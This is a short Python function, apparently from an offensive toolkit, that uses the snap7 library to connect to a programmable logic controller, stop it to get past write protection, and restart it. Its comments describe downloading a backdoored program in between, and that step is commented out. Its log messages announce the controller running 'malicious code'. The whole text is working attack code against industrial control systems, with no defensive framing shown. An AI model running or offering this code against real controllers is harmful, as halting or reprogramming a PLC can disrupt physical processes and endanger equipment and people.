def bypass_write_protection(plc_ip):
    """
    Bypass write protection by forcing PLC to STOP mode
    """
    import snap7

    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1)

    # Check current PLC status
    status = plc.get_cpu_state()
    print(f"[*] Current PLC state: {status}")

    if status == 'RUN':
        # Stop PLC (disables write protection)
        plc.plc_stop()
        print("[+] PLC stopped")

        # Now download malicious program
        # plc.download('OB', 1, backdoored_code)

        # Restart PLC
        plc.plc_start()
        print("[+] PLC restarted with malicious code")

    plc.disconnect()
